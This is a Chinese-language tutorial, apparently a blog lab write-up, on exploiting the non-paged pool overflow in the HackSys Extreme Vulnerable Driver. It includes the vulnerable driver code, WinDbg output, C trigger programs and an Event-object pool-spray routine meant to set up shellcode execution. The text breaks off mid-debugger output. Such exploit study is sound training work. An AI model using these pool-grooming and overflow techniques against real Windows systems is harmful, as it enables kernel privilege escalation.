<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _POOL_TYPE</span><br><span class="line">ntdll!_POOL_TYPE</span><br><span class="line">   NonPagedPool = <span class="number">0</span>n0</span><br><span class="line">   PagedPool = <span class="number">0</span>n1</span><br><span class="line">   NonPagedPoolMustSucceed = <span class="number">0</span>n2</span><br><span class="line">   DontUseThisType = <span class="number">0</span>n3</span><br><span class="line">   NonPagedPoolCacheAligned = <span class="number">0</span>n4</span><br><span class="line">   PagedPoolCacheAligned = <span class="number">0</span>n5</span><br><span class="line">   NonPagedPoolCacheAlignedMustS = <span class="number">0</span>n6</span><br><span class="line">   MaxPoolType = <span class="number">0</span>n7</span><br><span class="line">   NonPagedPoolSession = <span class="number">0</span>n32</span><br><span class="line">   PagedPoolSession = <span class="number">0</span>n33</span><br><span class="line">   NonPagedPoolMustSucceedSession = <span class="number">0</span>n34</span><br><span class="line">   DontUseThisTypeSession = <span class="number">0</span>n35</span><br><span class="line">   NonPagedPoolCacheAlignedSession = <span class="number">0</span>n36</span><br><span class="line">   PagedPoolCacheAlignedSession = <span class="number">0</span>n37</span><br><span class="line">   NonPagedPoolCacheAlignedMustSSession = <span class="number">0</span>n38</span><br></pre></td></tr></table></figure>

<p><code>MilnitializeNonPagedPool</code>函数确定非换页内存池的起始和结束物理页面帧<code>MiStartOfInitialPoolFrame</code> 和 <code>MiEndOfInitialPoolFrame</code>,</p>
<p>一旦非换页内存池的结构已建立，接下来系统代码可以通过 <code>MiAllocatePoolPages</code> 和<code>MiFreePoolPages</code> 函数来申请和归还页面。</p>
<p>Windows充分利用这些页面自身的内存来构建起一组空闲页面链表，每个页面都是一个<code>MMFREE_POOL_ENTRY</code>结构，如图所示。<code>MiInitializeNonPagedPool</code>函数已经把数组<code>MmNonPagedPoolFreeListHead</code>初始化成只包含一个个完整的空闲内存块，该内存块包括所有的非换页页面。</p>
<p><img src="/2023/08/12/2023-8-HEVD/921642_PH3NWQD64R2TXXQ.jpg" alt="img"></p>
<p>在非换页内存池的结构中，每个空闲链表中的每个节点包含1、2、3、4或4个以上的页面，在同一个节点上的页面其虚拟地址空间是连续的。第一个页面的List域构成了链表结构，Size域指明了这个节点所包含的页面数量，Owner域指向自己;后续页面的List和 Size域没有使用，但Owner域很重要，它指向第一个页面。</p>
<p>非换页内存池中的页面回收是通过MiFreePoolPages函数来完成的,</p>
<p>内核和设备驱动程序使用非分页池来存储系统无法处理页面错误时可能访问的数据，非页面缓冲池总是保持在物理内存中，非页面缓冲池虚拟内存被分配物理内存。存储在非分页池中的通用系统数据结构包括表示进程和线程的内核和对象，互斥对象，信号灯和事件等同步对象，表示为文件对象的文件引用以及I / O请求包（IRP）代表I / O操作</p>
<h3 id="池风水"><a href="#池风水" class="headerlink" title="池风水"></a>池风水</h3><p>HEVD 驱动, 有漏洞的用户缓冲区被分配在非分页池，所以需要找到一种方法来修改非分页池。</p>
<blockquote>
<p>内核池空闲池块保存在一个链表结构里，当进行申请该池的内存的时候，会从链表里找到合适大小的池块进行分配，如果找不到，则会寻找相近大小的池块进行切割然后再分配；</p>
<p>当空闲链表里有位置相邻的空闲池块，则会进行合并操作，合并成一个大的池块</p>
</blockquote>
<p>由于池块分布是无序的，但我们可以利用<code>CreateEventA</code>分配池块来控制池块分布，每个<code>event</code>块大小为<code>0x40</code>。</p>
<p>Windows 提供了一种<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682655(v=vs.85).aspx">Event</a>对象, 该对象存储在非分页池中，可以使用<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682396(v=vs.85).aspx">CreateEvent</a> API 来创建：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HANDLE WINAPI <span class="title function_">CreateEvent</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes,</span></span><br><span class="line"><span class="params">  _In_     BOOL                  bManualReset,</span></span><br><span class="line"><span class="params">  _In_     BOOL                  bInitialState,</span></span><br><span class="line"><span class="params">  _In_opt_ LPCTSTR               lpName</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>在这里我们需要用这个API创建两个足够大的<code>Event</code>对象数组，然后通过使用<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/closehandle">CloseHandle</a> API 释放某些<code>Event</code> 对象，从而在分配的池块中造成空隙，经合并形成更大的空闲块:    </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI <span class="title function_">CloseHandle</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_ HANDLE hObject</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>通过大量申请Event对象，然后通过CloseHandle释放一部分Event对象留出合适的空间给用户缓冲区，那么用户缓冲区很可能就会出现在我们挖出的空缺位置上，并且同时紧紧挨着一个Event对象，也就是说，可以固定让用户缓冲区后面紧挨着一个Event对象</p>
<p>这里需要创建两个足够大的Event对象数组，一个用来消耗小尺寸空闲内存块，一个用来挖出空缺提供给用户缓冲区</p>
<p>在空出的空闲块中，我们将有漏洞的用户缓冲区插入，图示如下</p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230814023410736.png" alt="image-20230814023410736"></p>
<h2 id="利用原理-amp-Event对象结构"><a href="#利用原理-amp-Event对象结构" class="headerlink" title="利用原理&amp;Event对象结构"></a>利用原理&amp;Event对象结构</h2><blockquote>
<p>控制缓冲区紧挨着一个Event对象，通过覆盖伪造一个<code>OBJECT_TYPE</code>头，覆盖指向<code>OBJECT_TYPE_INITIALIZER</code>中的一个过程的指针，通过执行该过程从而执行shellcode</p>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-exallocatepoolwithtag"><code>ExAllocatePoolWithTag</code></a>函数分配了一块非分页内存池，然后将一些信息打印出来，又验证缓冲区是否驻留在用户模式下，然后用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=vs-2019"><code>memcpy</code></a>函数将<code>UserBuffer</code>拷贝到<code>KernelBuffer</code>，同样的拷贝，同样的没有控制Size的大小，只是一个是栈溢出一个是池溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">TriggerBufferOverflowNonPagedPool</span><span class="params">(<span class="type">void</span> *UserBuffer, <span class="type">unsigned</span> <span class="type">int</span> Size)</span></span><br><span class="line">&#123;</span><br><span class="line">  PVOID v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Allocating Pool chunk\n&quot;</span>);</span><br><span class="line">  v2 = ExAllocatePoolWithTag(NonPagedPool, <span class="number">0x1F8</span>u, <span class="number">0x6B636148</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="string">&quot;NonPagedPool&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Size: 0x%X\n&quot;</span>, <span class="number">504</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, v2);</span><br><span class="line">    ProbeForRead(UserBuffer, <span class="number">0x1F8</span>u, <span class="number">1u</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer Size: 0x%X\n&quot;</span>, Size);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, v2);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer Size: 0x%X\n&quot;</span>, <span class="number">504</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Buffer Overflow in NonPagedPool\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(v2, UserBuffer, Size);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Freeing Pool chunk\n&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, v2);</span><br><span class="line">    ExFreePoolWithTag(v2, <span class="number">0x6B636148</span>u);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line">    result = <span class="number">0xC0000017</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD bReturn = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x1f8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">	RtlFillMemory(buf, <span class="number">0x1f8</span>, <span class="number">0x41</span>);</span><br><span class="line">	hDevice = CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+]Start to get HANDLE...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE || hDevice == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+]Failed to get HANDLE!!!\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+]Success to get HANDLE!\n&quot;</span>);</span><br><span class="line">	DeviceIoControl(hDevice, <span class="number">0x22200f</span>, buf, <span class="number">0x1f8</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;bReturn, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; u HEVD!TriggerBufferOverflowNonPagedPool+<span class="number">0xf7</span> </span><br><span class="line">HEVD!TriggerBufferOverflowNonPagedPool+<span class="number">0xf7</span> [c:\projects\hevd\driver\hevd\bufferoverflownonpagedpool.c @ <span class="number">137</span>]:</span><br><span class="line">a9b1fdc5 e812c4fbff      call    HEVD!<span class="built_in">memcpy</span> (a9adc1dc)</span><br><span class="line">a9b1fdca <span class="number">688625b</span>2a9      push    offset HEVD! ?? ::NNGAKEGL::`<span class="built_in">string</span><span class="number">&#x27;</span> (a9b22586)</span><br><span class="line">a9b1fdcf <span class="number">6</span>a03            push    <span class="number">3</span></span><br><span class="line">a9b1fdd1 <span class="number">6</span>a4d            push    <span class="number">4</span>Dh</span><br><span class="line">a9b1fdd3 ffd7            call    edi</span><br><span class="line">a9b1fdd5 <span class="number">681</span>a21b2a9      push    offset HEVD! ?? ::NNGAKEGL::`<span class="built_in">string</span><span class="number">&#x27;</span> (a9b2211a)</span><br><span class="line">a9b1fdda <span class="number">688e24</span>b2a9      push    offset HEVD! ?? ::NNGAKEGL::`<span class="built_in">string</span><span class="number">&#x27;</span> (a9b2248e)</span><br><span class="line">a9b1fddf <span class="number">6</span>a03            push    <span class="number">3</span></span><br><span class="line">kd&gt; bp a9b1fdc5</span><br><span class="line">kd&gt; g</span><br><span class="line">****** HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL ******</span><br><span class="line">[+] Allocating Pool chunk</span><br><span class="line">[+] Pool Tag: <span class="string">&#x27;kcaH&#x27;</span></span><br><span class="line">[+] Pool Type: NonPagedPool</span><br><span class="line">[+] Pool Size: <span class="number">0x1F8</span></span><br><span class="line">[+] Pool Chunk: <span class="number">0x85A52308</span></span><br><span class="line">[+] UserBuffer: <span class="number">0x001FF990</span></span><br><span class="line">[+] UserBuffer Size: <span class="number">0x1F8</span></span><br><span class="line">[+] KernelBuffer: <span class="number">0x85A52308</span></span><br><span class="line">[+] KernelBuffer Size: <span class="number">0x1F8</span></span><br><span class="line">[+] Triggering Buffer Overflow in NonPagedPool</span><br><span class="line">Break instruction exception - code <span class="number">80000003</span> (first chance)</span><br><span class="line">HEVD!TriggerBufferOverflowNonPagedPool+<span class="number">0xf7</span>:</span><br><span class="line">a9b1fdc5 e812c4fbff      call    HEVD!<span class="built_in">memcpy</span> (a9adc1dc)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>局部变量KernelBuffer为0x85a52308</p>
<p>可以用<code>!pool address</code>命令查看address周围地址处的池信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !pool <span class="number">0x85a52308</span></span><br><span class="line">Pool page <span class="number">85</span>a52308 region is Unknown</span><br><span class="line"> <span class="number">85</span>a52000 size:  <span class="number">138</span> previous size:    <span class="number">0</span>  (Allocated)  ALPC (Protected)</span><br><span class="line"> <span class="number">85</span>a52138 size:   <span class="number">10</span> previous size:  <span class="number">138</span>  (Free)       ....</span><br><span class="line"> <span class="number">85</span>a52148 size:   <span class="number">70</span> previous size:   <span class="number">10</span>  (Free )  MmRl</span><br><span class="line"> <span class="number">85</span>a521b8 size:  <span class="number">148</span> previous size:   <span class="number">70</span>  (Free)       FIPc</span><br><span class="line">*<span class="number">85</span>a52300 size:  <span class="number">200</span> previous size:  <span class="number">148</span>  (Allocated) *Hack</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> <span class="number">85</span>a52500 size:   <span class="number">48</span> previous size:  <span class="number">200</span>  (Allocated)  Vad </span><br><span class="line"> <span class="number">85</span>a52548 size:   <span class="number">40</span> previous size:   <span class="number">48</span>  (Free )  FIPc</span><br><span class="line"> <span class="number">85</span>a52588 size:   <span class="number">18</span> previous size:   <span class="number">40</span>  (Free)       FOCX</span><br><span class="line"> <span class="number">85</span>a525a0 size:   <span class="number">48</span> previous size:   <span class="number">18</span>  (Allocated)  Vad </span><br><span class="line"> <span class="number">85</span>a525e8 size:   b8 previous size:   <span class="number">48</span>  (Allocated)  File (Protected)</span><br><span class="line"> <span class="number">85</span>a526a0 size:   <span class="number">70</span> previous size:   b8  (Free )  FMfc</span><br><span class="line"> <span class="number">85</span>a52710 size:  <span class="number">3b</span>8 previous size:   <span class="number">70</span>  (Free)       CcPL</span><br><span class="line"> <span class="number">85</span>a52ac8 size:   <span class="number">40</span> previous size:  <span class="number">3b</span>8  (Allocated)  Even (Protected)</span><br><span class="line"> <span class="number">85</span>a52b08 size:  <span class="number">3</span>a0 previous size:   <span class="number">40</span>  (Free)       FOCX</span><br><span class="line"> <span class="number">85</span>a52ea8 size:   b8 previous size:  <span class="number">3</span>a0  (Allocated)  File (Protected)</span><br><span class="line"> <span class="number">85</span>a52f60 size:   <span class="number">70</span> previous size:   b8  (Allocated)  FMfc</span><br><span class="line"> <span class="number">85</span>a52fd0 size:   <span class="number">30</span> previous size:   <span class="number">70</span>  (Free)       FOCX</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>85a52300</code>就是<code>TriggerBufferOverflowNonPagedPool</code>中申请到的池的起始地址，大小为0x200</p>
<p>所以末尾地址为85a52300+200=85a52500，这也是下一个池块的头部所在地址。查看memcpy运行后该地址处的内存：</p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230814034535823.png" alt="image-20230814034535823"></p>
<p>我们的目标就是构造数据，修改下一个池块的内容，从而达到运行我们的shellcode的目的。</p>
<h3 id="构造溢出池块空间"><a href="#构造溢出池块空间" class="headerlink" title="构造溢出池块空间"></a>构造溢出池块空间</h3><p>池块分布是无序的，而我们希望能在非分页内存池中控制池块分布，使得溢出点所在池块后边是我们构建的池块，从而达到溢出利用条件。</p>
<blockquote>
<p>我们知道存储在非分页池中的通用系统数据结构包括表示进程和线程的内核对象，互斥对象，信号量和事件等同步对象，表示为文件对象的文件引用以及I/O请求包（IRP）代表I/O操作。</p>
</blockquote>
<p>Windows 提供了一种<code>Event</code>对象, 该对象存储在非分页池中，可以使用<code>CreateEvent</code> API 来创建：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HANDLE WINAPI <span class="title function_">CreateEvent</span><span class="params">( </span></span><br><span class="line"><span class="params">  _In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes,</span></span><br><span class="line"><span class="params">  _In_     BOOL                  bManualReset,</span></span><br><span class="line"><span class="params">  _In_     BOOL                  bInitialState,</span></span><br><span class="line"><span class="params">  _In_opt_ LPCTSTR               lpName</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>该函数会生成一个<code>Event</code>事件对象，它的大小为 0x40</p>
<p>因为在刚才的调试中我们知道我们的池大小为 <code>0x1f8 + 8(POOL_HEADER) = 0x200</code>，所以多次申请就刚好可以填满我们的池，如果把池铺满成我们的Event对象，我们再用<code>CloseHandle</code>函数释放一些对象，我们就可以在Event中间留出一些我们可以操控的空间</p>
<p>测试代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE Event_Object[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Pool_Spray</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">		Event_Object[i] = CreateEventA(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 0x40 * 8 = 0x200</span></span><br><span class="line">		<span class="comment">// 每次[0-7]*n的event空间，而8*n不释放.进而构成ex40*8=x200的空闲空间</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">			CloseHandle(Event_Object[i + j]);</span><br><span class="line">		i += <span class="number">8</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD bReturn = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x1f8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">	RtlFillMemory(buf, <span class="number">0x1f8</span>, <span class="number">0x41</span>);</span><br><span class="line">	hDevice = CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+]Start to get HANDLE...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE || hDevice == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+]Failed to get HANDLE!!!\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+]Success to get HANDLE!\n&quot;</span>);</span><br><span class="line">	Pool_Spray();</span><br><span class="line">	DeviceIoControl(hDevice, <span class="number">0x22200f</span>, buf, <span class="number">0x1f8</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;bReturn, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !pool KernelBuffer</span><br><span class="line">Pool page <span class="number">85b</span>81888 region is Nonpaged pool</span><br><span class="line"> <span class="number">85b</span>81000 size:   <span class="number">40</span> previous size:    <span class="number">0</span>  (Free)       Even</span><br><span class="line"> <span class="number">85b</span>81040 size:   <span class="number">40</span> previous size:   <span class="number">40</span>  (Free )  Even (Protected)</span><br><span class="line"> <span class="number">85b</span>81080 size:   <span class="number">40</span> previous size:   <span class="number">40</span>  (Free )  Even (Protected)</span><br><span class="line"> <span class="number">85b</span>810c0 size:   c0 previous size:   <span class="number">40</span>  (Free)       Even</span><br><span class="line"> <span class="number">85b</span>81180 size:   <span class="number">40</span> previous size:   c0  (Allocated)  Even (Protected)</span><br><span class="line"> <span class="number">85b</span>811c0 size:  <span class="number">200</span> previous size:   <span class="number">40</span>  (Free)       Even</span><br><span class="line"> <span class="number">85b</span>813c0 size:   <span class="number">40</span> previous size:  <span class="number">200</span>  (Allocated)  Even (Protected)</span><br><span class="line"> <span class="number">85b</span>81400 size:  <span class="number">200</span> previous size:   <span class="number">40</span>  (Free)       Even</span><br><span class="line"> <span class="number">85b</span>81600 size:   <span class="number">40</span> previous size:  <span class="number">200</span>  (Allocated)  Even (Protected)</span><br><span class="line"> <span class="number">85b</span>81640 size:  <span class="number">200</span> previous size:   <span class="number">40</span>  (Free)       Even</span><br><span class="line"> <span class="number">85b</span>81840 size:   <span class="number">40</span> previous size:  <span class="number">200</span>  (Allocated)  Even (Protected)</span><br><span class="line">*<span class="number">85b</span>81880 size:  <span class="number">200</span> previous size:   <span class="number">40</span>  (Allocated) *Hack</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> <span class="number">85b</span>81a80 size:   <span class="number">40</span> previous size:  <span class="number">200</span>  (Allocated)  Even (Protected)</span><br><span class="line"> <span class="number">85b</span>81ac0 size:  <span class="number">200</span> previous size:   <span class="number">40</span>  (Free)       Even</span><br><span class="line"> <span class="number">85b</span>81cc0 size:   <span class="number">40</span> previous size:  <span class="number">200</span>  